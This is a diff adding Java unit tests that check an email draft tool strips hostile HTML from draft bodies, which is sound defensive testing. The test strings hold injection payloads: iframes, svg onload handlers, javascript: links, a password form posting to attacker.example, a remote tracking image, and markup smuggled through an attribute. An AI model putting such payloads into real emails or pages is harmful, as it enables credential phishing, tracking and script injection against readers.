@@ -471,6 +471,57 @@ class EmailMcpToolDraftsTest {
     assertEquals("<p>Hello again</p><br><br><div class=\"ec-signature\">" + banner + "</div>", savedDraft().getContent().getBody());
   }
 
+  /**
+   * A copy of the signature block hidden in an attribute value is not taken for the
+   * signature: it is cleaned with the attribute, and nothing the attribute carried comes
+   * out as markup in the stored body.
+   */
+  @Test
+  void updateEmailDraftNeverTakesASignatureCopyInsideAnAttributeForTheSignature() throws Exception {
+    saveDraftEchoes();
+    when(emailBoxService.getDraft(DRAFT_ID, USERNAME)).thenReturn(storedDraft("Hello", "<p>Hi</p>", "bob@acme.com"));
+    String attack = "<p>Hi</p>" + SIGNATURE_BLOCK + "<span title='" + SIGNATURE_BLOCK
+        + "<img src=https://attacker.example/p><iframe src=https://attacker.example></iframe><svg onload=alert(1)></svg>"
+        + "<form action=https://attacker.example><input type=password></form>'>.</span>";
+
+    emailMcpTool.updateEmailDraft(DRAFT_ID, null, null, attack, null, null, 1L);
+
+    org.jsoup.nodes.Document stored = org.jsoup.Jsoup.parse(savedDraft().getContent().getBody());
+    assertTrue(stored.select("iframe, form, input, svg, [onload]").isEmpty(), stored.body().html());
+    assertTrue(stored.select("img").stream().noneMatch(image -> image.attr("src").contains("attacker")), stored.body().html());
+  }
+
+  /**
+   * What would run or post elsewhere is taken out of a body, at creation as at update:
+   * frames, forms, SVG event handlers and script links.
+   */
+  @Test
+  void theDraftToolsDropFramesFormsHandlersAndScriptLinks() throws Exception {
+    saveDraftEchoes();
+    String hostile = "<p>Hi</p><iframe src=\"https://evil.example\"></iframe><form action=\"https://evil.example\"><input type=\"password\"></form>"
+        + "<svg onload=\"alert(1)\"></svg><a href=\"javascript:alert(1)\">x</a>";
+    emailMcpTool.createEmailDraft(List.of("bob@acme.com"), "Hello", hostile, null, null, null, false);
+    when(emailBoxService.getDraft(DRAFT_ID, USERNAME)).thenReturn(storedDraft("Hello", "<p>Hi</p>", "bob@acme.com"));
+    emailMcpTool.updateEmailDraft(DRAFT_ID, null, null, hostile, null, null, 1L);
+
+    ArgumentCaptor<Email> captor = ArgumentCaptor.forClass(Email.class);
+    verify(emailBoxService, Mockito.times(2)).saveDraft(captor.capture(), eq(USERNAME), eq(true));
+    for (Email saved : captor.getAllValues()) {
+      String body = saved.getContent().getBody();
+      org.jsoup.nodes.Document parsed = org.jsoup.Jsoup.parse(body);
+      assertTrue(parsed.select("iframe, form, input, svg, [onload]").isEmpty(), body);
+      assertFalse(body.contains("javascript:"), body);
+    }
+  }
+
+  /** The cleaning's own refusal of remote content holds when it is reached directly. */
+  @Test
+  void theCleaningRefusesRemoteContentWhenReachedDirectly() {
+    IllegalArgumentException refusal = assertThrows(IllegalArgumentException.class,
+                                                    () -> EmailMcpTool.cleanDraftHtml("<p>Hi</p><img src=\"https://evil.example/t.gif\">"));
+    assertTrue(refusal.getMessage().startsWith("body_html loads images or styles from the internet"), refusal.getMessage());
+  }
+
   /** A change without the revision it was read at changes nothing. */
   @Test
   void updateEmailDraftRequiresTheRevisionItWasReadAt() throws Exception {
